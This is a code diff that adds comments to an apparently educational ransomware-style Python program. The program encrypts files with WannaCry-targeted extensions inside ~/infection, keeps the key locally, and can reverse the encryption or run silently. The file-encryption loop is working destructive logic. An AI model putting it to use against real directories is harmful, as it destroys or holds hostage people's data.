@@ -11,9 +11,10 @@ GREEN = "\033[32m"
 YELLOW = "\033[33m"
 
 PROGRAM_VERSION = "0.0.42"
-SECRET_KEY_FILE = ".key.stockholm"
-DIRECTORY = os.path.expanduser("~/infection")
+SECRET_KEY_FILE = ".key.stockholm"  # Default file for storing the encryption key
+DIRECTORY = os.path.expanduser("~/infection")   # Directory to process
 
+# Supported file extensions for encryption (Wannacry targets)
 WANNACRY_EXTENSIONS = {
     ".123", ".3dm", ".3ds", ".3g2", ".3gp", ".602", ".7z", ".aes", ".ai", ".asc",
     ".asf", ".asm", ".asp", ".avi", ".bak", ".bat", ".bmp", ".brd", ".bz2", ".c",
@@ -36,12 +37,16 @@ WANNACRY_EXTENSIONS = {
 }
 
 def process_files(secret_key, reverse):
+    # Creates a SecretBox instance using 'secret_key' (32-byte key) for encryption and decryption.
     box = secret.SecretBox(secret_key)
 
     if not os.path.exists(DIRECTORY):
         print(f"{RED}Directory not found: {DIRECTORY}{RESET}")
         return
 
+    # root: The current folder's path.
+    # _ (or dirs): A list of subdirectories in the current folder.
+    # files: A list of filenames in the current folder.
     for root, _, files in os.walk(DIRECTORY):
         for file_name in files:
             file_path = os.path.join(root, file_name)
@@ -51,7 +56,7 @@ def process_files(secret_key, reverse):
                     print(f"{YELLOW}Skipping unencrypted file: {file_path}{RESET}")
                     continue
 
-                decrypt_files(box, file_path)
+                decrypt_file(box, file_path)
 
             else:
                 file_ext = os.path.splitext(file_name)[1].lower()
@@ -60,15 +65,20 @@ def process_files(secret_key, reverse):
                     print(f"{YELLOW}Skipping file with unsupported extension: {file_path}{RESET}")
                     continue
 
-                encrypt_files(box, file_path)
+                encrypt_file(box, file_path)
 
-def encrypt_files(box, file_path):
+def encrypt_file(box, file_path):
     try:
-        with open(file_path, 'rb+') as file:
+        with open(file_path, 'rb+') as file:    # +: Allows both reading and writing to the file.
             file_data = file.read()
+
+            # Encrypts 'file_data' using the SecretBox instance 'box'.
             encrypted_data = box.encrypt(file_data)
-            
+
+            # Moves the file pointer to the beginning of the file for overwriting content.
             file.seek(0)
+
+            # Deletes the remaining content in the file from the current pointer position.
             file.truncate()
             file.write(encrypted_data)
 
@@ -78,16 +88,19 @@ def encrypt_files(box, file_path):
     except Exception as e:
         print(f"{RED}Failed to encrypt {file_path}: {e}{RESET}")
 
-def decrypt_files(box, file_path):
+def decrypt_file(box, file_path):
     try:
         with open(file_path, 'rb+') as file:
             file_data = file.read()
+
+            # Decrypts 'file_data' using the SecretBox instance 'box'.
             decrypted_data = box.decrypt(file_data)
 
             file.seek(0)
             file.truncate()
             file.write(decrypted_data)
 
+        # Removes the .ft extension from file_path.
         new_path = file_path.rsplit(".ft", 1)[0]
         os.rename(file_path, new_path)
 
@@ -113,6 +126,7 @@ def create_key():
             print(f"{RED}Failed to load key from {SECRET_KEY_FILE}: {e}{RESET}")
             exit(1)
     else:
+        # Generates a random 32-byte key for the SecretBox.
         secret_key = utils.random(secret.SecretBox.KEY_SIZE)
 
         with open(SECRET_KEY_FILE, 'wb') as file:
@@ -144,9 +158,9 @@ def load_key(key_path):
 def parse_arguments():
     parser = argparse.ArgumentParser(description="Harmless malware")
 
-    parser.add_argument("-v", "--version", action="version", version=f"{YELLOW}%(prog)s {PROGRAM_VERSION}{RESET}", help="Show the program version.")
-    parser.add_argument("-r", "--reverse", metavar="KEY_FILE", type=str, help="Path to the file containing the key to reverse the infection.")
-    parser.add_argument("-s", "--silent", action="store_true", help="Run the program without producing any output.")
+    parser.add_argument("-v", "--version", action="version", version=f"{YELLOW}%(prog)s {PROGRAM_VERSION}{RESET}", help="show the version of the program.")
+    parser.add_argument("-r", "--reverse", metavar="KEY_FILE", type=str, help="path to the key file to reverse the infection.")
+    parser.add_argument("-s", "--silent", action="store_true", help="run the program without producing any output.")
 
     return parser.parse_args()
 
@@ -154,7 +168,10 @@ def main():
     args = parse_arguments()
 
     if args.silent:
+        # Opens a write-only file descriptor to /dev/null (a sink for discarding output).
         devnull = os.open(os.devnull, os.O_WRONLY)
+
+        # Redirects the standard output (sys.stdout) to /dev/null, silencing program output.
         os.dup2(devnull, sys.stdout.fileno())
 
     if args.reverse:
